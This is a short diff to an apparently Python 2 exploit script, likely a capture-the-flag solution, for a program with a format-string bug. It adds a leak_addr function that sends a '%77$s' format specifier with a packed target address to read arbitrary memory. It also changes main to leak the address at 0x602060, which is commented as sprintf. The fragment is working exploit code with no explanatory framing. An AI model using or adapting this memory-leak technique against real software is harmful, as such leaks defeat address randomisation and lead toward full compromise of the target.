@@ -98,11 +98,16 @@ def decrypt(ct):
 def run(text):
     return decrypt( encrypt( text ) )
 
+def leak_addr(addr):
+    leak = run('%77$s   ' + p64(addr)).split(' ')[0]
+    leak = leak + '\x00' * (8 - len(leak))
+    return u64(leak)
+
 def main():
     recvuntil('> ')
     setkey()
     # %76$p es mi input
-    print run('AAAAAAAA %76$p')
+    print hex(leak_addr(0x602060)) # sprintf
 
 
 if __name__ == '__main__':
